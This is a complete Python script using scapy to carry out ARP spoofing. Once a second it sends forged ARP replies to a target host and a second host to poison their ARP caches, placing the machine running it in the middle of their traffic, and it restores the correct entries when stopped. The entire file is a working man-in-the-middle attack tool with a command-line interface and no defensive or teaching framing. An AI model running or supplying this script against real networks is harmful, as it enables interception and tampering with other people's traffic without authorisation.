#!/usr/bin/python3

import os
import sys
import time
import socket
import argparse
from scapy.all import *
import concurrent.futures

def restore(dstIP: str, srcIP: str):
	dstMac = get_mac(dstIP)
	srcMac = get_mac(srcIP)

	packet = ARP(op=2, pdst=dstIP, hwdst=dstMac, psrc=srcIP, hwsrc=srcMac)
	send(packet, verbose=0)

def spoof(tgtHost: str, spoofIP: str):
	tgtIP = socket.gethostbyname(tgtHost)

	packet = ARP(op=2, pdst=tgtIP, hwdst=get_mac(tgtIP), psrc=spoofIP)
	send(packet, verbose=0)

def get_mac(tgtIP: str) -> str:
	request = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=tgtIP)
	ans, unans = srp(request, timeout=5, verbose=0)

	for sent, received in ans:
		return received.hwsrc
	
	print(f'[-] NO RESPONSE FROM {tgtIP}')
	exit(0)

def main():
	parser = argparse.ArgumentParser(usage='Usage of spoofer: --H <target host> --S')
	parser.add_argument('--H', dest='tgtHost', type=str, help='specify target host')
	parser.add_argument('--S', dest='spoofHost', type=str, help='specify spoof host')
	args = parser.parse_args()
	tgtHost = args.tgtHost
	spoofHost = args.spoofHost
	
	if (tgtHost == None) | (spoofHost == None):
		print(parser.usage)
		exit(0)

	print('[+] STARTING SPOOFER')

	try:
		sent_packets_count = 0
		while True:
			spoof(tgtHost, spoofHost)
			spoof(spoofHost, tgtHost)
			sent_packets_count += 2
			print(f'[*] PACKETS SENT {sent_packets_count}')
			time.sleep(1)
	except KeyboardInterrupt:
		restore(spoofHost, tgtHost)
		restore(tgtHost, spoofHost)
		print('[-] SPOOFER STOPPED')

if __name__ == '__main__':
	main()